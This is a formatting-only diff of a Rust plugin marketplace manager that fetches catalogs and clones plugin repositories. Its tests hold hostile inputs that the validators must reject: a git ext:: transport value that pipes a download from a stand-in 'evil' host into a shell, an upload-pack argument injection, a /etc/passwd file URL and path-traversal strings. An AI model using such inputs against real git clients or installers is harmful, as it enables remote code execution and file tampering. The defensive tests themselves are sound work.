@@ -113,9 +113,7 @@ impl MarketplaceManager {
     /// Gets the current ISO8601 timestamp.
     fn now_iso8601() -> String {
         use std::time::{SystemTime, UNIX_EPOCH};
-        let duration = SystemTime::now()
-            .duration_since(UNIX_EPOCH)
-            .unwrap();
+        let duration = SystemTime::now().duration_since(UNIX_EPOCH).unwrap();
         let secs = duration.as_secs();
         // Simple ISO8601 format: "2024-01-01T00:00:00Z"
         // This is a simplified implementation - in production, use chrono
@@ -130,7 +128,12 @@ impl MarketplaceManager {
     }
 
     /// Adds a new marketplace source.
-    pub fn add_source(&self, name: String, repository_url: String, is_official: bool) -> MarketplaceSource {
+    pub fn add_source(
+        &self,
+        name: String,
+        repository_url: String,
+        is_official: bool,
+    ) -> MarketplaceSource {
         let source = MarketplaceSource {
             id: Self::generate_source_id(),
             name,
@@ -177,7 +180,9 @@ impl MarketplaceManager {
 
     /// Gets a source by ID.
     pub fn get_source(&self, source_id: &str) -> Option<MarketplaceSource> {
-        self.sources.read().unwrap()
+        self.sources
+            .read()
+            .unwrap()
             .iter()
             .find(|s| s.id == source_id)
             .cloned()
@@ -193,12 +198,19 @@ impl MarketplaceManager {
         let repo = repository_url
             .trim_end_matches('/')
             .replace("https://github.com/", "");
-        format!("https://raw.githubusercontent.com/{}/main/.claude-plugin/marketplace.json", repo)
+        format!(
+            "https://raw.githubusercontent.com/{}/main/.claude-plugin/marketplace.json",
+            repo
+        )
     }
 
     /// Fetches and parses a marketplace catalog from a source.
-    pub async fn fetch_marketplace(&self, source_id: &str) -> MarketplaceResult<Vec<MarketplacePlugin>> {
-        let source = self.get_source(source_id)
+    pub async fn fetch_marketplace(
+        &self,
+        source_id: &str,
+    ) -> MarketplaceResult<Vec<MarketplacePlugin>> {
+        let source = self
+            .get_source(source_id)
             .ok_or_else(|| MarketplaceError::SourceNotFound(source_id.to_string()))?;
 
         let url = Self::get_marketplace_json_url(&source.repository_url);
@@ -220,15 +232,15 @@ impl MarketplaceManager {
             .map_err(|e| MarketplaceError::NetworkError(e.to_string()))?;
 
         // Parse the catalog
-        let catalog: MarketplaceCatalog = serde_json::from_str(&text)
-            .map_err(|e| {
-                let error_msg = format!("Invalid JSON: {}", e);
-                self.update_source_error(source_id, &error_msg);
-                MarketplaceError::ParseError(error_msg)
-            })?;
+        let catalog: MarketplaceCatalog = serde_json::from_str(&text).map_err(|e| {
+            let error_msg = format!("Invalid JSON: {}", e);
+            self.update_source_error(source_id, &error_msg);
+            MarketplaceError::ParseError(error_msg)
+        })?;
 
         // Convert to MarketplacePlugin list
-        let plugins: Vec<MarketplacePlugin> = catalog.plugins
+        let plugins: Vec<MarketplacePlugin> = catalog
+            .plugins
             .into_iter()
             .map(|p| p.into_marketplace_plugin(source_id, &source.repository_url))
             .collect();
@@ -237,7 +249,8 @@ impl MarketplaceManager {
         self.update_source_success(source_id);
 
         // Cache the plugins
-        self.available_plugins.insert(source_id.to_string(), plugins.clone());
+        self.available_plugins
+            .insert(source_id.to_string(), plugins.clone());
 
         Ok(plugins)
     }
@@ -260,11 +273,11 @@ impl MarketplaceManager {
     }
 
     /// Refreshes all enabled marketplace sources.
-    pub async fn refresh_all_marketplaces(&self) -> Vec<(String, MarketplaceResult<Vec<MarketplacePlugin>>)> {
+    pub async fn refresh_all_marketplaces(
+        &self,
+    ) -> Vec<(String, MarketplaceResult<Vec<MarketplacePlugin>>)> {
         let sources = self.get_sources();
-        let enabled_sources: Vec<_> = sources.into_iter()
-            .filter(|s| s.is_enabled)
-            .collect();
+        let enabled_sources: Vec<_> = sources.into_iter().filter(|s| s.is_enabled).collect();
 
         let mut results = Vec::new();
 
@@ -279,7 +292,8 @@ impl MarketplaceManager {
     /// Gets all available plugins from enabled marketplaces.
     pub fn get_available_plugins(&self) -> Vec<MarketplacePlugin> {
         let sources = self.get_sources();
-        let enabled_ids: Vec<_> = sources.iter()
+        let enabled_ids: Vec<_> = sources
+            .iter()
             .filter(|s| s.is_enabled)
             .map(|s| &s.id)
             .collect();
@@ -298,20 +312,29 @@ impl MarketplaceManager {
     // ========== Plugin Installation ==========
 
     /// Gets the installation directory for a plugin based on scope.
-    fn get_install_dir(&self, scope: InstallScope, project_path: Option<&str>) -> MarketplaceResult<PathBuf> {
+    fn get_install_dir(
+        &self,
+        scope: InstallScope,
+        project_path: Option<&str>,
+    ) -> MarketplaceResult<PathBuf> {
         match scope {
-            InstallScope::User => {
-                Self::get_user_plugins_dir()
-                    .ok_or_else(|| MarketplaceError::InvalidPath("Cannot determine home directory".to_string()))
-            }
+            InstallScope::User => Self::get_user_plugins_dir().ok_or_else(|| {
+                MarketplaceError::InvalidPath("Cannot determine home directory".to_string())
+            }),
             InstallScope::Project => {
-                let project = project_path
-                    .ok_or_else(|| MarketplaceError::InvalidPath("Project path required for project scope".to_string()))?;
+                let project = project_path.ok_or_else(|| {
+                    MarketplaceError::InvalidPath(
+                        "Project path required for project scope".to_string(),
+                    )
+                })?;
                 Ok(Path::new(project).join(".claude").join("plugins"))
             }
             InstallScope::Local => {
-                let project = project_path
-                    .ok_or_else(|| MarketplaceError::InvalidPath("Project path required for local scope".to_string()))?;
+                let project = project_path.ok_or_else(|| {
+                    MarketplaceError::InvalidPath(
+                        "Project path required for local scope".to_string(),
+                    )
+                })?;
                 Ok(Path::new(project).join(".claude.local").join("plugins"))
             }
         }
@@ -402,9 +425,7 @@ impl MarketplaceManager {
                 "repository URL contains whitespace or control characters".to_string(),
             ));
         }
-        let allowed = u.starts_with("https://")
-            || u.starts_with("ssh://")
-            || u.starts_with("git@"); // scp-like git@host:owner/repo
+        let allowed = u.starts_with("https://") || u.starts_with("ssh://") || u.starts_with("git@"); // scp-like git@host:owner/repo
         if !allowed {
             return Err(MarketplaceError::CloneError(format!(
                 "unsupported repository URL (only https/ssh remotes allowed): {u}"
@@ -471,7 +492,11 @@ impl MarketplaceManager {
     ///
     /// This is used for plugins that are subdirectories within a larger monorepo
     /// (e.g., anthropics/claude-code/plugins/frontend-design).
-    async fn clone_sparse(repo_url: &str, target_dir: &Path, subpath: &str) -> MarketplaceResult<()> {
+    async fn clone_sparse(
+        repo_url: &str,
+        target_dir: &Path,
+        subpath: &str,
+    ) -> MarketplaceResult<()> {
         if !Self::is_safe_source_subpath(subpath) {
             return Err(MarketplaceError::InvalidPath(format!(
                 "unsafe plugin source path: {subpath}"
@@ -546,7 +571,9 @@ impl MarketplaceManager {
             .hide_console_window()
             .output()
             .await
-            .map_err(|e| MarketplaceError::CloneError(format!("Failed to run git checkout: {}", e)))?;
+            .map_err(|e| {
+                MarketplaceError::CloneError(format!("Failed to run git checkout: {}", e))
+            })?;
 
         if !output.status.success() {
             let stderr = String::from_utf8_lossy(&output.stderr);
@@ -568,9 +595,11 @@ impl MarketplaceManager {
         }
 
         // Rename the subdirectory to the target location
-        tokio::fs::rename(&source_subdir, target_dir).await.map_err(|e| {
-            MarketplaceError::CloneError(format!("Failed to move plugin directory: {}", e))
-        })?;
+        tokio::fs::rename(&source_subdir, target_dir)
+            .await
+            .map_err(|e| {
+                MarketplaceError::CloneError(format!("Failed to move plugin directory: {}", e))
+            })?;
 
         // Clean up the temporary directory
         let _ = tokio::fs::remove_dir_all(&temp_dir).await;
@@ -681,17 +710,23 @@ impl MarketplaceManager {
         project_path: Option<&str>,
     ) -> MarketplaceResult<InstalledPlugin> {
         // Find the plugin in available plugins
-        let plugin = self.get_available_plugins()
+        let plugin = self
+            .get_available_plugins()
             .into_iter()
             .find(|p| p.id == marketplace_plugin_id)
             .ok_or_else(|| MarketplaceError::PluginNotFound(marketplace_plugin_id.to_string()))?;
 
         // Get repository URL
-        let repo_url = plugin.repository_url.as_ref()
+        let repo_url = plugin
+            .repository_url
+            .as_ref()
             .or(plugin.download_url.as_ref())
-            .ok_or_else(|| MarketplaceError::PluginNotFound(
-                format!("{}: No repository URL", marketplace_plugin_id)
-            ))?;
+            .ok_or_else(|| {
+                MarketplaceError::PluginNotFound(format!(
+                    "{}: No repository URL",
+                    marketplace_plugin_id
+                ))
+            })?;
 
         // Check if already installed (scope the lock guard)
         {
@@ -768,7 +803,10 @@ impl MarketplaceManager {
         };
 
         // Add to installed plugins
-        self.installed_plugins.write().unwrap().push(installed_plugin.clone());
+        self.installed_plugins
+            .write()
+            .unwrap()
+            .push(installed_plugin.clone());
 
         Ok(installed_plugin)
     }
@@ -779,7 +817,8 @@ impl MarketplaceManager {
         let plugin_path_string = {
             let mut installed = self.installed_plugins.write().unwrap();
 
-            let idx = installed.iter()
+            let idx = installed
+                .iter()
                 .position(|p| p.id == installed_plugin_id)
                 .ok_or_else(|| MarketplaceError::NotInstalled(installed_plugin_id.to_string()))?;
 
@@ -813,7 +852,11 @@ impl MarketplaceManager {
     // ========== Session Configuration ==========
 
     /// Gets the marketplace config for a session.
-    pub fn get_session_config(&self, project_path: &str, session_id: u32) -> SessionMarketplaceConfig {
+    pub fn get_session_config(
+        &self,
+        project_path: &str,
+        session_id: u32,
+    ) -> SessionMarketplaceConfig {
         let key = (project_path.to_string(), session_id);
         self.session_configs
             .get(&key)
@@ -833,14 +876,26 @@ impl MarketplaceManager {
 
         let mut config = self.session_configs.entry(key).or_default();
         if enabled {
-            config.disabled_plugins.retain(|id| id != installed_plugin_id);
-            if !config.enabled_plugins.contains(&installed_plugin_id.to_string()) {
+            config
+                .disabled_plugins
+                .retain(|id| id != installed_plugin_id);
+            if !config
+                .enabled_plugins
+                .contains(&installed_plugin_id.to_string())
+            {
                 config.enabled_plugins.push(installed_plugin_id.to_string());
             }
         } else {
-            config.enabled_plugins.retain(|id| id != installed_plugin_id);
-            if !config.disabled_plugins.contains(&installed_plugin_id.to_string()) {
-                config.disabled_plugins.push(installed_plugin_id.to_string());
+            config
+                .enabled_plugins
+                .retain(|id| id != installed_plugin_id);
+            if !config
+                .disabled_plugins
+                .contains(&installed_plugin_id.to_string())
+            {
+                config
+                    .disabled_plugins
+                    .push(installed_plugin_id.to_string());
             }
         }
     }
@@ -890,7 +945,9 @@ mod tests {
     #[test]
     fn validate_clone_url_rejects_ext_transport_rce() {
         // git's ext:: transport executes an arbitrary command — must be rejected.
-        assert!(MarketplaceManager::validate_clone_url("ext::sh -c 'curl http://evil|sh'").is_err());
+        assert!(
+            MarketplaceManager::validate_clone_url("ext::sh -c 'curl http://evil|sh'").is_err()
+        );
         assert!(MarketplaceManager::validate_clone_url("fd::17/foo").is_err());
         assert!(MarketplaceManager::validate_clone_url("file:///etc/passwd").is_err());
         assert!(MarketplaceManager::validate_clone_url("--upload-pack=payload").is_err());
@@ -900,7 +957,10 @@ mod tests {
 
     #[test]
     fn validate_clone_url_allows_normal_remotes() {
-        assert!(MarketplaceManager::validate_clone_url("https://github.com/anthropics/claude-code").is_ok());
+        assert!(MarketplaceManager::validate_clone_url(
+            "https://github.com/anthropics/claude-code"
+        )
+        .is_ok());
         assert!(MarketplaceManager::validate_clone_url("ssh://git@github.com/o/r.git").is_ok());
         assert!(MarketplaceManager::validate_clone_url("git@github.com:o/r.git").is_ok());
     }
@@ -911,7 +971,9 @@ mod tests {
         assert!(MarketplaceManager::sanitize_plugin_dir_name("..").is_err());
         assert!(MarketplaceManager::sanitize_plugin_dir_name("../../etc/evil").is_err());
         assert!(MarketplaceManager::sanitize_plugin_dir_name("..\\..\\Windows\\evil").is_err());
-        assert!(MarketplaceManager::sanitize_plugin_dir_name("C:\\Users\\v\\Startup\\evil").is_err());
+        assert!(
+            MarketplaceManager::sanitize_plugin_dir_name("C:\\Users\\v\\Startup\\evil").is_err()
+        );
         assert!(MarketplaceManager::sanitize_plugin_dir_name("").is_err());
         // Legitimate ids: `owner/plugin` collapses to a single safe component.
         assert_eq!(
@@ -930,7 +992,9 @@ mod tests {
         // dir and the result is then renamed into the install dir, so anything
         // that escapes the join is a plugin-installs-arbitrary-directory bug.
         assert!(!MarketplaceManager::is_safe_source_subpath("../../etc"));
-        assert!(!MarketplaceManager::is_safe_source_subpath("plugins/../../../etc"));
+        assert!(!MarketplaceManager::is_safe_source_subpath(
+            "plugins/../../../etc"
+        ));
         assert!(!MarketplaceManager::is_safe_source_subpath("/etc/passwd"));
         assert!(!MarketplaceManager::is_safe_source_subpath(""));
         // Windows-shaped escapes. The verdict must not depend on the host OS —
@@ -938,12 +1002,18 @@ mod tests {
         // rejects `\` and `:` outright rather than relying on `components()`.
         // Root-relative is the sharp case: NOT `is_absolute()` even on Windows,
         // yet `join` still discards the base and keeps the drive.
-        assert!(!MarketplaceManager::is_safe_source_subpath("C:\\Users\\v\\Documents"));
-        assert!(!MarketplaceManager::is_safe_source_subpath("\\Users\\v\\Documents"));
+        assert!(!MarketplaceManager::is_safe_source_subpath(
+            "C:\\Users\\v\\Documents"
+        ));
+        assert!(!MarketplaceManager::is_safe_source_subpath(
+            "\\Users\\v\\Documents"
+        ));
         assert!(!MarketplaceManager::is_safe_source_subpath("\\"));
 
         // Real monorepo plugin paths keep working.
-        assert!(MarketplaceManager::is_safe_source_subpath("plugins/frontend-design"));
+        assert!(MarketplaceManager::is_safe_source_subpath(
+            "plugins/frontend-design"
+        ));
         assert!(MarketplaceManager::is_safe_source_subpath("plugin"));
     }
 
@@ -1002,9 +1072,16 @@ mod tests {
     #[test]
     fn test_marketplace_json_url() {
         let url = MarketplaceManager::get_marketplace_json_url("https://github.com/owner/repo");
-        assert_eq!(url, "https://raw.githubusercontent.com/owner/repo/main/.claude-plugin/marketplace.json");
+        assert_eq!(
+            url,
+            "https://raw.githubusercontent.com/owner/repo/main/.claude-plugin/marketplace.json"
+        );
 
-        let url_trailing = MarketplaceManager::get_marketplace_json_url("https://github.com/owner/repo/");
-        assert_eq!(url_trailing, "https://raw.githubusercontent.com/owner/repo/main/.claude-plugin/marketplace.json");
+        let url_trailing =
+            MarketplaceManager::get_marketplace_json_url("https://github.com/owner/repo/");
+        assert_eq!(
+            url_trailing,
+            "https://raw.githubusercontent.com/owner/repo/main/.claude-plugin/marketplace.json"
+        );
     }
 }
